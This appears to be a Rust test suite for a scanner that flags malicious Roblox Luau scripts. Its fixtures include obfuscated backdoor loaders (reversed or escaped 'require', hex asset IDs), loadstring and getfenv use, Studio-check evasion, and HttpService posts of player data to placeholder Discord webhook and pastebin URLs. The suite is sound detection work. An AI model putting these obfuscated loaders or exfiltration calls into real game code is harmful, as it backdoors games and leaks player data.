use bloxguard_core::analysis::analyze;
use bloxguard_core::model::{Document, Instance, Limits};
use std::collections::BTreeMap;

const FAKE_ID_A: u64 = 999_000_000_000_001;
const FAKE_ID_B: u64 = 999_000_000_000_002;

fn script(source: &str) -> Document {
    Document {
        input: "FAKE_fixture.luau".into(),
        instances: vec![Instance {
            name: "FAKE_Script".into(),
            class: "Script".into(),
            source: Some(source.into()),
            ..Instance::default()
        }],
        ..Document::default()
    }
}

fn rules(source: &str) -> Vec<String> {
    analyze(&script(source), 0, &Limits::default(), &[])
        .findings
        .into_iter()
        .map(|finding| finding.rule_id)
        .collect()
}

#[test]
fn bg001_numeric_and_alias_loaders_with_clean_lookalikes() {
    for source in [
        format!("require({FAKE_ID_A})"),
        format!("local r = require; r({FAKE_ID_B})"),
        format!("getfenv()[\"req\" .. \"uire\"]({FAKE_ID_A})"),
        format!("rawget(_G, string.reverse(\"eriuqer\"))({FAKE_ID_B})"),
    ] {
        assert!(rules(&source).contains(&"BG001".into()), "{source}");
    }
    for source in [
        "require(script.Parent.FAKE_Module)",
        "local require = print; require(999000000000001)",
    ] {
        assert!(!rules(source).contains(&"BG001".into()), "{source}");
    }
}

#[test]
fn bg001_unresolved_is_kept_and_trusted_ids_are_suppressed() {
    let result = analyze(&script("require(FAKE_dynamic)"), 0, &Limits::default(), &[]);
    assert_eq!(result.findings[0].rule_id, "BG001");
    assert_eq!(
        result.findings[0].confidence,
        bloxguard_core::finding::Confidence::Low
    );
    assert!(
        analyze(
            &script(&format!("require({FAKE_ID_A})")),
            0,
            &Limits::default(),
            &[FAKE_ID_A]
        )
        .findings
        .is_empty()
    );
}

#[test]
fn normal_instance_and_string_requires_have_no_high_or_critical_findings() {
    for source in [
        "local ReplicatedStorage = game:GetService(\"ReplicatedStorage\")\nlocal Packages = ReplicatedStorage:WaitForChild(\"Packages\")\nlocal Promise = require(Packages.Promise)\nreturn Promise",
        "local Util = require(game.ReplicatedStorage.Shared.Util)\nreturn Util",
        "local Signal = require(\"./Signal\")\nreturn Signal",
        "return require(script:FindFirstAncestor(\"Packages\").Promise)",
        "local function lazy(module)\nreturn require(module)\nend\nreturn lazy",
        "local RS = game:GetService(\"ReplicatedStorage\")\nlocal Mod = require(RS.Modules:FindFirstChild(\"Inventory\"))\nreturn Mod",
    ] {
        let result = analyze(&script(source), 0, &Limits::default(), &[]);
        assert!(
            result.findings.iter().all(|finding| !matches!(
                finding.severity,
                bloxguard_core::finding::Severity::High
                    | bloxguard_core::finding::Severity::Critical
            )),
            "{source}: {:?}",
            result.findings
        );
    }
}

#[test]
fn opaque_require_targets_are_low_severity_and_confidence() {
    let result = analyze(
        &script("local function lazy(module) return require(module) end"),
        0,
        &Limits::default(),
        &[],
    );
    let finding = result
        .findings
        .iter()
        .find(|finding| finding.rule_id == "BG001")
        .expect("opaque require remains visible");
    assert_eq!(finding.severity, bloxguard_core::finding::Severity::Low);
    assert_eq!(finding.confidence, bloxguard_core::finding::Confidence::Low);
}

#[test]
fn only_all_digit_string_requires_are_treated_as_asset_ids() {
    for source in [
        "require(\"./Signal\")",
        "require(\"@pkg/x\")",
        "require(\"123x\")",
    ] {
        assert!(rules(source).is_empty(), "{source}");
    }
    let result = analyze(
        &script(&format!("require(\"{FAKE_ID_A}\")")),
        0,
        &Limits::default(),
        &[],
    );
    assert!(result.findings.iter().any(|finding| {
        finding.rule_id == "BG001"
            && finding.severity == bloxguard_core::finding::Severity::High
            && finding.confidence == bloxguard_core::finding::Confidence::High
    }));
}

#[test]
fn aliases_are_scope_aware() {
    let source =
        format!("local r = require; do local r = print; r({FAKE_ID_A}) end; r({FAKE_ID_B})");
    assert_eq!(
        rules(&source)
            .iter()
            .filter(|rule| rule.as_str() == "BG001")
            .count(),
        1
    );
    assert!(
        !rules("local function require(x) return x end; require(999000000000001)")
            .contains(&"BG001".into())
    );
}

#[test]
fn dangerous_functions_are_invoked_through_known_wrappers() {
    for (source, expected) in [
        ("pcall(require, 999000000000201)", "BG001"),
        ("task.spawn(require, 999000000000215)", "BG001"),
        (
            "local ok, f = pcall(loadstring, \"return 1\")\nif ok then f() end",
            "BG003",
        ),
        ("coroutine.wrap(getfenv)", "BG004"),
        ("xpcall(setfenv, print, function() end, {})", "BG004"),
    ] {
        assert!(rules(source).contains(&expected.into()), "{source}");
    }
}

#[test]
fn wrapper_api_signatures_forward_the_actual_dangerous_call_arguments() {
    for source in [
        "xpcall(require, warn, 999000000000223)",
        "task.delay(1, require, 999000000000224)",
        "delay(1, require, 999000000000225)",
        "coroutine.wrap(require)(999000000000226)",
    ] {
        let result = analyze(&script(source), 0, &Limits::default(), &[]);
        assert!(
            result.findings.iter().any(|finding| {
                finding.rule_id == "BG001"
                    && finding.severity == bloxguard_core::finding::Severity::High
                    && finding.confidence == bloxguard_core::finding::Confidence::High
            }),
            "{source}: {:?}",
            result.findings
        );
    }
}

#[test]
fn uninvoked_coroutine_wrap_records_a_callable_escape() {
    let result = analyze(
        &script("local wrapped = coroutine.wrap(require)\nreturn wrapped"),
        0,
        &Limits::default(),
        &[],
    );
    assert!(result.findings.iter().any(|finding| {
        finding.rule_id == "BG001"
            && finding.severity == bloxguard_core::finding::Severity::High
            && finding.confidence == bloxguard_core::finding::Confidence::Medium
    }));
}

#[test]
fn dangerous_callable_value_escapes_are_reported() {
    for (source, expected) in [
        ("local m = {}\nm.load = require", "BG001"),
        ("_G.FAKE_loader = require", "BG001"),
        ("local m = { load = loadstring }", "BG003"),
        ("FAKE_sink(getfenv)", "BG004"),
        ("return setfenv", "BG004"),
    ] {
        let result = analyze(&script(source), 0, &Limits::default(), &[]);
        let finding = result
            .findings
            .iter()
            .find(|finding| finding.rule_id == expected)
            .unwrap_or_else(|| panic!("missing {expected} for {source}"));
        assert_eq!(finding.severity, bloxguard_core::finding::Severity::High);
        assert_eq!(
            finding.confidence,
            bloxguard_core::finding::Confidence::Medium
        );
    }
}

#[test]
fn local_aliases_remain_calls_instead_of_value_escapes() {
    let result = analyze(
        &script("local r = require\nr(999000000000213)"),
        0,
        &Limits::default(),
        &[],
    );
    let findings: Vec<_> = result
        .findings
        .iter()
        .filter(|finding| finding.rule_id == "BG001")
        .collect();
    assert_eq!(findings.len(), 1);
    assert_eq!(
        findings[0].confidence,
        bloxguard_core::finding::Confidence::High
    );
}

#[test]
fn luau_strings_numbers_and_constant_library_calls_are_folded() {
    for (source, expected) in [
        (
            r#"_G["\114\101\113\117\105\114\101"](999000000000202)"#,
            "BG001",
        ),
        (r#"_G[("eriuqer"):reverse()](999000000000203)"#, "BG001"),
        (
            r#"local k = table.concat({"re", "quire"})
_G[k](999000000000205)"#,
            "BG001",
        ),
        ("require(0xe31b9d9a00d1)", "BG001"),
        ("require(999_000_000_000_210)", "BG001"),
        (
            r#"require(tonumber(("212000000000999"):reverse()))"#,
            "BG001",
        ),
        (
            r#"local f = _G["\108\111\97\100\115\116\114\105\110\103"]("return 1")
f()"#,
            "BG003",
        ),
        (
            r#"local f = _G[("gnirtsdaol"):reverse()]("return 1")
f()"#,
            "BG003",
        ),
    ] {
        let result = analyze(&script(source), 0, &Limits::default(), &[]);
        assert!(
            result.findings.iter().any(|finding| {
                finding.rule_id == expected
                    && finding.confidence == bloxguard_core::finding::Confidence::High
            }),
            "{source}: {:?}",
            result.findings
        );
    }
}

#[test]
fn bounded_string_methods_format_and_concat_fold_constants() {
    for source in [
        r#"_G[(" REQUIRE "):sub(2, -2):lower()](999000000000217)"#,
        r#"_G[string.upper("require"):lower()](999000000000218)"#,
        r#"_G[string.rep("re", 1) .. "quire"](999000000000219)"#,
        r#"_G[string.format("%s%d", "require", 0):sub(1, -2)](999000000000220)"#,
        r#"_G[table.concat({"re", "qu", "ire"}, "")](999000000000221)"#,
    ] {
        assert!(rules(source).contains(&"BG001".into()), "{source}");
    }
}

#[test]
fn luau_escape_forms_decode_without_executing_source() {
    for key in [
        r#"\x72\x65\x71\x75\x69\x72\x65"#,
        r#"\u{72}\u{65}\u{71}\u{75}\u{69}\u{72}\u{65}"#,
        "re\\z  \n\tquire",
    ] {
        let source = format!(r#"_G["{key}"](999000000000222)"#);
        assert!(rules(&source).contains(&"BG001".into()), "{source}");
    }
    assert!(
        rules("require(0b11100011000110111001110110011010000000001101001)")
            .contains(&"BG001".into())
    );
}

#[test]
fn resolved_values_are_part_of_the_stable_fingerprint() {
    let first = analyze(
        &script(&format!("local id={FAKE_ID_A}; require(id)")),
        0,
        &Limits::default(),
        &[],
    );
    let second = analyze(
        &script(&format!("local id={FAKE_ID_B}; require(id)")),
        0,
        &Limits::default(),
        &[],
    );
    assert_ne!(
        first.findings[0].fingerprint,
        second.findings[0].fingerprint
    );
}

#[test]
fn bg003_runtime_code_with_clean_strings() {
    for source in [
        "loadstring(\"return 1\")()",
        "local run = _G.loadstring; run(\"print('FAKE')\")",
    ] {
        assert!(rules(source).contains(&"BG003".into()), "{source}");
    }
    for source in [
        "local loadstring = function(x) return x end; loadstring('FAKE')",
        "print('loadstring(FAKE)')",
    ] {
        assert!(!rules(source).contains(&"BG003".into()), "{source}");
    }
}

#[test]
fn bg003_variable_payload_content_changes_the_fingerprint() {
    fn finding(
        result: &bloxguard_core::analysis::AnalysisResult,
    ) -> &bloxguard_core::finding::Finding {
        result
            .findings
            .iter()
            .find(|finding| finding.rule_id == "BG003")
            .expect("BG003 finding")
    }
    let report = |payload: &str, comment: &str| {
        analyze(
            &script(&format!(
                "local payload = {payload:?}\n-- {comment}\nloadstring(payload)"
            )),
            0,
            &Limits::default(),
            &[],
        )
    };
    let first = report("return 1", "FAKE first note");
    let moved = report("return 1", "FAKE unrelated replacement note");
    let changed = report("return 2", "FAKE first note");
    assert_eq!(finding(&first).fingerprint, finding(&moved).fingerprint);
    assert_ne!(finding(&first).fingerprint, finding(&changed).fingerprint);
    assert!(finding(&first).evidence.contains("payload sha256:"));
}

#[test]
fn evidence_is_rendered_in_lexical_source_order() {
    let result = analyze(
        &script(&format!(
            "require( -- FAKE unrelated comment\n {FAKE_ID_A})"
        )),
        0,
        &Limits::default(),
        &[],
    );
    let finding = result
        .findings
        .iter()
        .find(|finding| finding.rule_id == "BG001")
        .expect("BG001 finding");
    assert!(
        finding
            .evidence
            .starts_with(&format!("require({FAKE_ID_A})")),
        "{}",
        finding.evidence
    );
    assert!(!finding.evidence.contains("comment"));
}

#[test]
fn utf8_bom_is_stripped_before_lexing_and_parsing() {
    let result = analyze(
        &script(&format!("\u{feff}require({FAKE_ID_A})")),
        0,
        &Limits::default(),
        &[],
    );
    assert!(result.reasons.is_empty(), "{:?}", result.reasons);
    assert!(
        result
            .findings
            .iter()
            .any(|finding| finding.rule_id == "BG001")
    );
}

#[test]
fn constant_folding_output_caps_leave_an_incomplete_reason() {
    let result = analyze(
        &script("loadstring((\"x\"):rep(10_000_000))"),
        0,
        &Limits::default(),
        &[],
    );
    assert!(
        result
            .reasons
            .iter()
            .any(|reason| reason.contains("constant folding output limit")),
        "{:?}",
        result.reasons
    );
}

#[test]
fn bg004_environment_access_with_clean_lookalikes() {
    for source in [
        "getfenv().FAKE = true",
        "local s = setfenv; s(function() end, {})",
    ] {
        assert!(rules(source).contains(&"BG004".into()), "{source}");
    }
    for source in [
        "local getfenv = function() return {} end; getfenv()",
        "print('setfenv is old')",
    ] {
        assert!(!rules(source).contains(&"BG004".into()), "{source}");
    }
}

#[test]
fn bg002_resolves_value_objects_and_attributes_with_related_origin() {
    let mut properties = BTreeMap::new();
    properties.insert("Value".into(), serde_json::json!(FAKE_ID_A));
    let mut attributes = BTreeMap::new();
    attributes.insert("FAKE_asset".into(), serde_json::json!(FAKE_ID_B));
    let doc = Document {
        input: "FAKE_bundle".into(),
        instances: vec![
            Instance { name: "FAKE_Model".into(), class: "Model".into(), attributes, ..Instance::default() },
            Instance { name: "FAKE_Folder".into(), class: "Folder".into(), parent: Some(0), ..Instance::default() },
            Instance { name: "FAKE_Id".into(), class: "NumberValue".into(), parent: Some(1), properties, ..Instance::default() },
            Instance { name: "FAKE_Script".into(), class: "Script".into(), parent: Some(0), source: Some("require(script.Parent.FAKE_Folder:WaitForChild(\"FAKE_Id\").Value); require(script.Parent:GetAttribute(\"FAKE_asset\"))".into()), ..Instance::default() },
        ],
        ..Document::default()
    };
    let result = analyze(&doc, 3, &Limits::default(), &[]);
    let findings: Vec<_> = result
        .findings
        .iter()
        .filter(|finding| finding.rule_id == "BG002")
        .collect();
    assert_eq!(findings.len(), 2);
    assert!(
        findings
            .iter()
            .all(|finding| finding.related_locations.len() == 1)
    );
    assert!(
        findings.iter().any(
            |finding| finding.related_locations[0].location.property.as_deref() == Some("Value")
        )
    );
    assert!(findings.iter().any(
        |finding| finding.related_locations[0].location.attribute.as_deref() == Some("FAKE_asset")
    ));
}

#[test]
fn bg002_clean_dom_reads_do_not_report() {
    for source in [
        "require(script.Parent.FAKE_Module)",
        "local n = script.Parent:FindFirstChild('FAKE_missing'); require(n)",
    ] {
        let result = rules(source);
        assert!(!result.contains(&"BG002".into()), "{source}");
    }
}

#[test]
fn bg002_unresolved_property_keeps_origin_and_property_changes_fingerprint() {
    fn with_value(value: serde_json::Value) -> Document {
        let mut properties = BTreeMap::new();
        properties.insert("Value".into(), value);
        Document {
            input: "FAKE_property_bundle".into(),
            instances: vec![
                Instance {
                    name: "FAKE_Model".into(),
                    class: "Model".into(),
                    ..Instance::default()
                },
                Instance {
                    name: "FAKE_Id".into(),
                    class: "NumberValue".into(),
                    parent: Some(0),
                    properties,
                    ..Instance::default()
                },
                Instance {
                    name: "FAKE_Script".into(),
                    class: "Script".into(),
                    parent: Some(0),
                    source: Some("require(script.Parent.FAKE_Id.Value)".into()),
                    ..Instance::default()
                },
            ],
            ..Document::default()
        }
    }
    let unresolved = analyze(
        &with_value(serde_json::json!({"FAKE": true})),
        2,
        &Limits::default(),
        &[],
    );
    assert_eq!(unresolved.findings[0].rule_id, "BG002");
    assert_eq!(
        unresolved.findings[0].related_locations[0]
            .location
            .property
            .as_deref(),
        Some("Value")
    );
    let first = analyze(
        &with_value(serde_json::json!(FAKE_ID_A)),
        2,
        &Limits::default(),
        &[],
    );
    let second = analyze(
        &with_value(serde_json::json!(FAKE_ID_B)),
        2,
        &Limits::default(),
        &[],
    );
    assert_ne!(
        first.findings[0].fingerprint,
        second.findings[0].fingerprint
    );
}

#[test]
fn bg002_reports_values_that_leave_the_scanned_content() {
    let model = Document {
        input: "FAKE_model".into(),
        instances: vec![
            Instance {
                name: "FAKE_Model".into(),
                class: "Model".into(),
                ..Instance::default()
            },
            Instance {
                name: "FAKE_Loader".into(),
                class: "Script".into(),
                parent: Some(0),
                source: Some("require(script.Parent.Parent.FAKE_Config.Value)".into()),
                ..Instance::default()
            },
        ],
        ..Document::default()
    };
    for result in [
        analyze(
            &script("require(script.Parent.Parent.FAKE_Config.Value)"),
            0,
            &Limits::default(),
            &[],
        ),
        analyze(
            &script("require(workspace.FAKE_Config.Value)"),
            0,
            &Limits::default(),
            &[],
        ),
        analyze(&model, 1, &Limits::default(), &[]),
        analyze(
            &script("require(workspace.FAKE_Config:GetAttribute(\"FAKE_id\"))"),
            0,
            &Limits::default(),
            &[],
        ),
    ] {
        let finding = result
            .findings
            .iter()
            .find(|finding| finding.rule_id == "BG002")
            .expect("external value has BG002");
        assert_eq!(finding.confidence, bloxguard_core::finding::Confidence::Low);
        assert_eq!(
            finding.message,
            "value comes from outside the scanned content"
        );
        assert!(finding.related_locations.is_empty());
    }
}

#[test]
fn bg002_resolves_workspace_values_inside_a_place() {
    let mut properties = BTreeMap::new();
    properties.insert("Value".into(), serde_json::json!(FAKE_ID_A));
    let place = Document {
        input: "FAKE_place.rbxlx".into(),
        instances: vec![
            Instance {
                name: "Game".into(),
                class: "DataModel".into(),
                ..Instance::default()
            },
            Instance {
                name: "Workspace".into(),
                class: "Workspace".into(),
                parent: Some(0),
                ..Instance::default()
            },
            Instance {
                name: "FAKE_Id".into(),
                class: "NumberValue".into(),
                parent: Some(1),
                properties,
                ..Instance::default()
            },
            Instance {
                name: "FAKE_Loader".into(),
                class: "Script".into(),
                parent: Some(1),
                source: Some("require(workspace.FAKE_Id.Value)".into()),
                ..Instance::default()
            },
        ],
        ..Document::default()
    };
    let result = analyze(&place, 3, &Limits::default(), &[]);
    let finding = result
        .findings
        .iter()
        .find(|finding| finding.rule_id == "BG002")
        .expect("in-place value resolves");
    assert_eq!(
        finding.confidence,
        bloxguard_core::finding::Confidence::High
    );
    assert_eq!(finding.related_locations.len(), 1);
    assert_eq!(
        finding.related_locations[0].location.property.as_deref(),
        Some("Value")
    );
}

#[test]
fn arbitrary_global_value_paths_are_not_treated_as_external_dom() {
    let result = analyze(
        &script("require(_G.FAKE.Value)"),
        0,
        &Limits::default(),
        &[],
    );
    assert!(
        result
            .findings
            .iter()
            .any(|finding| finding.rule_id == "BG001")
    );
    assert!(
        result
            .findings
            .iter()
            .all(|finding| finding.rule_id != "BG002")
    );
}

#[test]
fn bg007_runtime_asset_loading_and_clean_service_calls() {
    for source in [
        format!("game:GetService('InsertService'):LoadAsset({FAKE_ID_A})"),
        format!("game:GetObjects('rbxassetid://{FAKE_ID_B}')"),
    ] {
        assert!(rules(&source).contains(&"BG007".into()), "{source}");
    }
    for source in [
        "game:GetService('ReplicatedStorage'):FindFirstChild('FAKE')",
        "print('LoadAsset')",
    ] {
        assert!(!rules(source).contains(&"BG007".into()), "{source}");
    }
}

#[test]
fn dot_and_aliased_service_methods_are_detected() {
    let bg007 =
        format!("local s=game:GetService('InsertService'); local f=s.LoadAsset; f(s,{FAKE_ID_A})");
    assert!(rules(&bg007).contains(&"BG007".into()));
    let bg008 = "local h=game:GetService('HttpService'); local f=h.PostAsync; f(h,'https://discord.com/api/webhooks/000/FAKE','{}')";
    assert!(rules(bg008).contains(&"BG008".into()));
    let bg009 = format!(
        "local r=game:GetService('RunService'); local f=r.IsStudio; if not f(r) then require({FAKE_ID_B}) end"
    );
    assert!(rules(&bg009).contains(&"BG009".into()));
}

#[test]
fn bg008_webhooks_but_not_fixed_analytics() {
    for source in [
        "game:GetService('HttpService'):PostAsync('https://discord.com/api/webhooks/000/FAKE', '{}')",
        "game:GetService('HttpService'):RequestAsync({Url='https://pastebin.com/FAKE', Method='POST'})",
    ] {
        assert!(rules(source).contains(&"BG008".into()), "{source}");
    }
    for source in [
        "game:GetService('HttpService'):PostAsync('https://analytics.example.test/events', '{}')",
        "game:GetService('HttpService'):GetAsync('https://example.test/FAKE_health')",
        "game:GetService('HttpService'):PostAsync('https://analytics.example.test/events', game:GetService('HttpService'):JSONEncode({event='round_start', count=1}))",
        "game:GetService('HttpService'):RequestAsync({Url='https://analytics.example.test/events', Method='POST', Body='{\"event\":\"FAKE_round\",\"count\":1}'})",
    ] {
        assert!(!rules(source).contains(&"BG008".into()), "{source}");
    }
}

#[test]
fn bg008_fixed_urls_still_flag_actual_player_or_game_data() {
    for source in [
        "game:GetService('HttpService'):PostAsync('https://FAKE.example.test/upload', tostring(player.UserId))",
        "game:GetService('HttpService'):RequestAsync({Url='https://FAKE.example.test/upload', Method='POST', Body=tostring(game.PlaceId)})",
    ] {
        assert!(rules(source).contains(&"BG008".into()), "{source}");
    }
    for source in [
        "game:GetService('HttpService'):PostAsync('https://analytics.example.test/events', '{\"field\":\"player.UserId\"}')",
        "-- player.UserId\ngame:GetService('HttpService'):PostAsync('https://analytics.example.test/events', '{}')",
    ] {
        assert!(!rules(source).contains(&"BG008".into()), "{source}");
    }
}

#[test]
fn bg008_folds_request_tables_proxy_webhooks_and_preencoded_sensitive_data() {
    for source in [
        r#"local H = game:GetService("HttpService")
H:RequestAsync({Url = "https://discord.com/api/" .. "webhooks/000/FAKE", Method = "POST", Body = "{}"})"#,
        r#"local H = game:GetService("HttpService")
local url = "https://discord.com/api/webhooks/000/FAKE"
H:RequestAsync({Url = url, Method = "POST", Body = "{}"})"#,
        r#"local H = game:GetService("HttpService")
local body = H:JSONEncode({place = game.PlaceId, job = game.JobId})
H:PostAsync("https://webhook-proxy.example.test/api/webhooks/000/FAKE", body)"#,
        r#"local H = game:GetService("HttpService")
local function send(player)
    local body = H:JSONEncode({name = player.Name, user = player.UserId})
    H:PostAsync("https://FAKE.example.test/upload", body)
end"#,
    ] {
        assert!(rules(source).contains(&"BG008".into()), "{source}");
    }
}

#[test]
fn bg008_clean_preencoded_analytics_stays_clean() {
    let source = r#"local HttpService = game:GetService("HttpService")
local ANALYTICS_URL = "https://analytics.example.test/v1/events"
local function track(name)
    local payload = HttpService:JSONEncode({event = name})
    HttpService:PostAsync(ANALYTICS_URL, payload)
end
track("round_end")"#;
    assert!(!rules(source).contains(&"BG008".into()));
}

#[test]
fn bg008_user_id_analytics_is_the_documented_known_false_positive() {
    let source = r#"local HttpService = game:GetService("HttpService")
game:GetService("Players").PlayerAdded:Connect(function(player)
    HttpService:PostAsync("https://analytics.example.test/v1/join", HttpService:JSONEncode({user = player.UserId}))
end)"#;
    assert!(rules(source).contains(&"BG008".into()));
}

#[test]
fn bg009_requires_evasion_plus_risky_behavior() {
    for source in [
        format!("if not game:GetService('RunService'):IsStudio() then require({FAKE_ID_A}) end"),
        format!("task.wait(120); game:GetService('InsertService'):LoadAsset({FAKE_ID_B})"),
    ] {
        assert!(rules(&source).contains(&"BG009".into()), "{source}");
    }
    for source in [
        "if game:GetService('RunService'):IsStudio() then print('FAKE debug') end",
        "task.wait(120); print('FAKE delayed effect')",
    ] {
        assert!(!rules(source).contains(&"BG009".into()), "{source}");
    }
}

fn inserted_script(source: &str) -> Document {
    Document {
        input: "FAKE_model".into(),
        instances: vec![
            Instance {
                name: "FAKE_Model".into(),
                class: "Model".into(),
                ..Instance::default()
            },
            Instance {
                name: "FAKE_Script".into(),
                class: "Script".into(),
                parent: Some(0),
                source: Some(source.into()),
                ..Instance::default()
            },
        ],
        ..Document::default()
    }
}

#[test]
fn bg010_prompts_and_redirects_only_in_inserted_context() {
    for source in [
        format!("game:GetService('MarketplaceService'):PromptProductPurchase(player, {FAKE_ID_A})"),
        format!("game:GetService('TeleportService'):Teleport({FAKE_ID_B}, player)"),
    ] {
        let result = analyze(&inserted_script(&source), 1, &Limits::default(), &[]);
        assert!(
            result
                .findings
                .iter()
                .any(|finding| finding.rule_id == "BG010"),
            "{source}"
        );
    }
    for source in [
        "game:GetService('MarketplaceService'):GetProductInfo(999000000000001)",
        "game:GetService('TeleportService'):TeleportToPrivateServer(999000000000002, 'FAKE', {})",
    ] {
        let result = analyze(&inserted_script(source), 1, &Limits::default(), &[]);
        assert!(
            !result
                .findings
                .iter()
                .any(|finding| finding.rule_id == "BG010"),
            "{source}"
        );
    }
    assert!(
        !rules(&format!(
            "game:GetService('TeleportService'):Teleport({FAKE_ID_A}, player)"
        ))
        .contains(&"BG010".into())
    );
}

#[test]
fn propagation_cap_is_reported_and_dynamic_require_survives() {
    let limits = Limits {
        max_analysis_steps: 0,
        ..Limits::default()
    };
    let result = analyze(&script("require(FAKE_unknown)"), 0, &limits, &[]);
    assert!(
        result
            .reasons
            .iter()
            .any(|reason| reason.contains("propagation limit"))
    );
    assert!(
        result
            .findings
            .iter()
            .any(|finding| finding.rule_id == "BG001")
    );
}

#[test]
fn parse_failure_is_partial_reason_instead_of_a_panic() {
    let result = analyze(&script("local ="), 0, &Limits::default(), &[]);
    assert!(result.findings.is_empty());
    assert!(
        result
            .reasons
            .iter()
            .any(|reason| reason.contains("could not parse"))
    );
}

#[test]
fn parser_budget_rejects_pathological_nesting_before_ast_build() {
    // Nesting caps are fixed lexical limits, independent of `max_depth`.
    let limits = Limits::default();
    let depth = bloxguard_core::analysis::MAX_LEXICAL_NESTING + 1;
    let source = format!("{}1{}", "(".repeat(depth), ")".repeat(depth));
    let result = analyze(&script(&source), 0, &limits, &[]);
    assert!(result.findings.is_empty());
    assert!(
        result
            .reasons
            .iter()
            .any(|reason| reason.contains("nesting depth"))
    );
}

#[test]
fn parser_budget_rejects_long_left_nested_expression_across_lines() {
    let limits = Limits::default();
    // Concatenation has its own cap since round 4.
    let source = std::iter::repeat_n("'FAKE'", bloxguard_core::analysis::MAX_CONCAT_OPERATORS + 2)
        .collect::<Vec<_>>()
        .join(" ..\n");
    let result = analyze(&script(&source), 0, &limits, &[]);
    assert!(
        result
            .reasons
            .iter()
            .any(|reason| reason.contains("expression complexity"))
    );
}

#[test]
fn parser_budget_rejects_deep_luau_type_syntax() {
    let limits = Limits::default();
    let depth = bloxguard_core::analysis::MAX_EXPRESSION_OPERATORS;
    let source = format!(
        "type FAKE_T = {}number{}",
        "FAKE_Box<".repeat(depth),
        ">".repeat(depth)
    );
    let result = analyze(&script(&source), 0, &limits, &[]);
    assert!(
        result
            .reasons
            .iter()
            .any(|reason| reason.contains("expression complexity")),
        "{:?}",
        result.reasons
    );
    let depth = bloxguard_core::analysis::MAX_LEXICAL_NESTING + 1;
    let source = format!(
        "type FAKE_T = {}number{}",
        "{ FAKE_a: ".repeat(depth),
        " }".repeat(depth)
    );
    let result = analyze(&script(&source), 0, &limits, &[]);
    assert!(
        result
            .reasons
            .iter()
            .any(|reason| reason.contains("nesting depth")),
        "{:?}",
        result.reasons
    );
}

#[test]
fn missing_script_source_is_incomplete() {
    let doc = Document {
        input: "FAKE_missing_source".into(),
        instances: vec![Instance {
            name: "FAKE_Script".into(),
            class: "Script".into(),
            ..Instance::default()
        }],
        ..Document::default()
    };
    assert!(
        analyze(&doc, 0, &Limits::default(), &[])
            .reasons
            .iter()
            .any(|reason| reason.contains("no readable Source"))
    );
}

#[test]
fn per_script_finding_output_is_bounded_and_marks_partial() {
    let source = std::iter::repeat_n(format!("require({FAKE_ID_A})"), 300)
        .collect::<Vec<_>>()
        .join(";");
    let result = analyze(&script(&source), 0, &Limits::default(), &[]);
    assert_eq!(result.findings.len(), 256);
    assert!(
        result
            .reasons
            .iter()
            .any(|reason| reason.contains("finding output limit"))
    );
}

#[test]
fn per_script_path_output_is_bounded() {
    let source = std::iter::repeat_n(format!("require({FAKE_ID_A})"), 256)
        .collect::<Vec<_>>()
        .join(";");
    let document = Document {
        input: "FAKE_long_path".into(),
        instances: vec![Instance {
            name: format!("FAKE_{}", "X".repeat(40_000)),
            class: "Script".into(),
            source: Some(source),
            ..Instance::default()
        }],
        ..Document::default()
    };
    let result = analyze(&document, 0, &Limits::default(), &[]);
    assert!(result.findings.len() < 256);
    assert!(
        result
            .reasons
            .iter()
            .any(|reason| reason.contains("finding output limit"))
    );
}
